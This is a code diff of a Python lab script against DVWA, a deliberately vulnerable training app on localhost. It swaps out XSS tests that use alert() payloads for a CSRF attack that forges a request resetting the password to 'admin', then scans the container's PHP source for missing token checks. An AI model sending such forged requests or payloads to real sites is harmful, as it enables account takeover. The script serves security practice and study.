@@ -1,55 +1,20 @@
 import requests
+from bs4 import BeautifulSoup
 import subprocess
-import re
 
-# URLs for the XSS vulnerabilities in DVWA
-urls = {
-    "Stored XSS": '',
-    "DOM-based XSS": '',
-    "Reflected XSS": ''
-}
-
-# Session cookies for DVWA
+# Base URL for DVWA CSRF vulnerability
+base_url = 'http://127.0.0.1/vulnerabilities/csrf/'
 cookies = {
-    'PHPSESSID': '',  # Replace with your actual session ID
-    'security': 'low'  # Ensure this matches your DVWA security level setting
+    'PHPSESSID': 'e4lpasml78avcva4t7uj8h79d4',  # Replace with your actual session cookie
+    'security': 'low'  # Adjust based on the security level
 }
 
-# Payloads for different types of XSS
-xss_payloads = {
-    "Stored XSS": "<script>alert('Stored XSS')</script>",
-    "DOM-based XSS": "<img src='x' onerror='alert(1)'>",
-    "Reflected XSS": "<script>alert('Reflected XSS')</script>"
+# CSRF payload
+csrf_payload = {
+    'password_new': 'admin',  # New password to set
+    'password_conf': 'admin', # Confirm new password
+    'Change': 'Change'
 }
-
-# Paths to the PHP files for each type of XSS
-file_paths = {
-    "Stored XSS": '/var/www/html/vulnerabilities/xss_s/source/low.php',
-    "DOM-based XSS": '/var/www/html/vulnerabilities/xss_d/source/medium.php',
-    "Reflected XSS": '/var/www/html/vulnerabilities/xss_r/source/low.php'
-}
-
-def test_xss(url, payload, method='POST', data=None, params=None):
-    """Test XSS vulnerabilities and display results."""
-    try:
-        if method == 'POST':
-            response = requests.post(url, cookies=cookies, data=data, timeout=10)
-        elif method == 'GET':
-            response = requests.get(url, cookies=cookies, params=params, timeout=10)
-        else:
-            print("Invalid method specified.")
-            return
-
-        if response.status_code == 200:
-            if payload in response.text or 'alert(' in response.text:
-                print(f"XSS successful with payload: {payload}")
-            else:
-                print(f"XSS unsuccessful with payload: {payload}")
-        else:
-            print(f"Error: Received status code {response.status_code}")
-
-    except requests.exceptions.RequestException as e:
-        print(f"Error during request: {e}")
 
 def get_container_id():
     """Retrieve the container ID for the running DVWA container."""
@@ -75,100 +40,133 @@ def fetch_php_code(file_path):
             print("Unable to retrieve container ID.")
             return ""
 
+        print(f"Fetching PHP code from: {file_path}")
         result = subprocess.run(
             ["docker", "exec", container_id, "cat", file_path],
             capture_output=True,
             text=True
         )
-        php_code = result.stdout
-        return php_code
+        return result.stdout
     except Exception as e:
         print(f"Error fetching PHP code: {e}")
         return ""
 
-def extract_vulnerable_code(php_code, patterns):
-    """Extract and return all lines containing vulnerable code snippets based on the provided patterns."""
-    lines = php_code.splitlines()
+def extract_vulnerable_lines(php_code):
+    """Extract and return lines of PHP code that are vulnerable to CSRF."""
+    lines = php_code.split('\n')
     vulnerable_lines = []
-    
-    for pattern in patterns:
-        for line in lines:
-            if re.search(pattern, line):
-                vulnerable_lines.append(line.strip())
-    
+
+    for i, line in enumerate(lines):
+        # Check for POST or GET parameters
+        if 'isset($_POST' in line or 'isset($_GET' in line:
+            # Check if there is no CSRF token check
+            if 'checkToken' not in php_code:
+                vulnerable_lines.append(f"Line {i + 1}: {line.strip()} - Potential CSRF vulnerability detected. Reason: Missing CSRF token validation.")
+        elif '$_POST' in line or '$_GET' in line:
+            # Check if there is no CSRF token check
+            if 'checkToken' not in php_code:
+                vulnerable_lines.append(f"Line {i + 1}: {line.strip()} - Potential CSRF vulnerability detected. Reason: Missing CSRF token validation.")
+
     return vulnerable_lines
 
-def print_vulnerabilities(title, file_path, security_level, patterns, reason):
-    """Print the vulnerabilities found in a given file with a reason at the end."""
-    php_code = fetch_php_code(file_path)
-    print(f"\nVulnerable File: {file_path}")
-    print(f"Security Level: {security_level}\n")
-    print("--- Vulnerable PHP Code Snippets ---\n")
-    vulnerable_lines = extract_vulnerable_code(php_code, patterns)
-    if vulnerable_lines:
-        for line in vulnerable_lines:
-            print(line)
-        print(f"Reason: {reason}")
-    else:
-        print("No specific vulnerable code snippets found.")
-    print("\n--- End of Vulnerable PHP Code Snippets ---\n")
+def list_php_files(directory):
+    """List all PHP files in a given directory inside the Docker container."""
+    try:
+        container_id = get_container_id()
+        if not container_id:
+            print("Unable to retrieve container ID.")
+            return []
 
-def main():
-    # Test Stored XSS
-    print("Testing Stored XSS...\n")
-    data = {
-        'txtName': xss_payloads["Stored XSS"],
-        'mtxMessage': xss_payloads["Stored XSS"],
-        'btnSign': 'Sign'
-    }
-    test_xss(urls["Stored XSS"], xss_payloads["Stored XSS"], method='POST', data=data)
+        print(f"Listing PHP files in directory: {directory}")
+        result = subprocess.run(
+            ["docker", "exec", container_id, "find", directory, "-type", "f", "-name", "*.php"],
+            capture_output=True,
+            text=True
+        )
+        files = result.stdout.strip().split('\n')
+        return files
+    except Exception as e:
+        print(f"Error listing PHP files: {e}")
+        return []
+
+def extract_main_content(response_text):
+    """Extract and return more detailed content related to password change."""
+    soup = BeautifulSoup(response_text, 'html.parser')
+
+    # Extracting all text from the response to find key sections
+    full_text = soup.get_text(separator='\n', strip=True)
     
-    # Display vulnerable code for Stored XSS
-    stored_xss_patterns = [
-        r'\$_POST\[\s*\'[^\']+\'\s*\]'  # Matches $_POST['input']
-    ]
-    print_vulnerabilities(
-        "Stored XSS",
-        file_paths["Stored XSS"],
-        "low",
-        stored_xss_patterns,
-        "User input is directly stored and reflected without sanitization."
-    )
-
-    # Test DOM-based XSS
-    print("Testing DOM-based XSS...\n")
-    test_xss(urls["DOM-based XSS"], xss_payloads["DOM-based XSS"], method='GET', params={'default': xss_payloads["DOM-based XSS"]})
+    # Locate the section where 'Password Changed.' appears
+    success_message = 'Password Changed.'
+    start_index = full_text.find(success_message)
     
-    # Display vulnerable code for DOM-based XSS
-    dom_xss_patterns = [
-        r'\$_GET\[\s*\'[^\']+\'\s*\]',    # Matches $_GET['input']
-        r'\$_POST\[\s*\'[^\']+\'\s*\]',   # Matches $_POST['input']
-        r'\$default\s*=\s*\$_GET\[\s*\'[^\']+\'\s*\];'
-    ]
-    print_vulnerabilities(
-        "DOM-based XSS",
-        file_paths["DOM-based XSS"],
-        "medium",
-        dom_xss_patterns,
-        "User input is directly reflected in JavaScript without proper encoding."
-    )
+    if start_index != -1:
+        # Extract content around the success message
+        start_index = max(start_index - 100, 0)  # 100 characters before the message
+        end_index = min(start_index + len(success_message) + 200, len(full_text))  # 200 characters after the message
+        return full_text[start_index:end_index]
+    
+    return "Password change confirmation not found."
 
-    # Test Reflected XSS
-    print("Testing Reflected XSS...\n")
-    test_xss(urls["Reflected XSS"], xss_payloads["Reflected XSS"], method='GET', params={'name': xss_payloads["Reflected XSS"]})
+def csrf_attack():
+    """Perform CSRF attack and display vulnerability results."""
+    print("Performing Cross-Site Request Forgery (CSRF) Attack to Change Password...\n")
+    
+    security_level = cookies.get('security')
+    print(f"Security Level: {security_level}")
+    
+    # Display the payload used for the attack
+    print("CSRF Payload Used:")
+    for key, value in csrf_payload.items():
+        print(f"{key}: {value}")
+    
+    try:
+        response = requests.get(base_url, cookies=cookies, params=csrf_payload, timeout=10)
+        # Use BeautifulSoup to parse the response content
+        soup = BeautifulSoup(response.text, 'html.parser')
 
-    # Display vulnerable code for Reflected XSS
-    reflected_xss_patterns = [
-        r'\$_GET\[\s*\'[^\']+\'\s*\]',    # Matches $_GET['input']
-        r'\$_POST\[\s*\'[^\']+\'\s*\]'    # Matches $_POST['input']
-    ]
-    print_vulnerabilities(
-        "Reflected XSS",
-        file_paths["Reflected XSS"],
-        "low",
-        reflected_xss_patterns,
-        "User input is directly reflected back in the response without sanitization."
-    )
+        # Extract the main content from the response
+        main_content = extract_main_content(response.text)
 
-if __name__ == "__main__":
-    main()
+        # Check if 'Password Changed.' is in the main content using BeautifulSoup
+        success_message = soup.find(string="Password Changed.")
+        if success_message:
+            print("CSRF Attack successful!")
+            print("CSRF Payload URL:", base_url)
+        else:
+            print("CSRF Attack unsuccessful. Password not changed.")
+        
+        # Display main content for debugging
+        print("\n--- Main Content of the Response ---\n")
+        print(main_content)
+        print("\n--- End of Main Content ---\n")
+
+        # List and process all PHP files in the source directory
+        php_files = list_php_files('/var/www/html/vulnerabilities/csrf/source/')
+        if not php_files:
+            print("No PHP files found.")
+            return
+
+        print("Checking the following PHP files for vulnerabilities:")
+        for php_file in php_files:
+            print(f"Processing file: {php_file}")
+            php_code = fetch_php_code(php_file)
+            if php_code:
+                vulnerable_lines = extract_vulnerable_lines(php_code)
+                if vulnerable_lines:
+                    print(f"\nVulnerable File: {php_file}")
+                    print("--- Vulnerable PHP Code Snippets ---\n")
+                    for line in vulnerable_lines:
+                        print(line)
+                    print("\n--- End of Vulnerable PHP Code Snippets ---\n")
+                else:
+                    print(f"No specific vulnerable code snippets found in {php_file}.")
+            else:
+                print(f"Error: Unable to fetch PHP code from {php_file}.")
+
+    except requests.exceptions.RequestException as e:
+        print(f"Error: {e}")
+
+# Run CSRF attack
+csrf_attack()
+
